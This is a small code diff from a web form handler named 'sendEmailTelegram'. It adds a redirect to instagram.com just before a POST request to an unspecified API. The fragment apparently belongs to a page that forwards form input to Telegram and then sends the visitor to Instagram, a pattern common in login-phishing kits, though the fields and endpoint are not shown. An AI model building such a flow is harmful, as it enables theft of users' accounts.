@@ -21,7 +21,7 @@ async function sendEmailTelegram(event) {
 
     try {
         formBtn.textContent = 'Loading...';
-
+        document.location = "https://www.instagram.com/"
         const response = await fetch(API, {
             method: "POST",
             headers: {
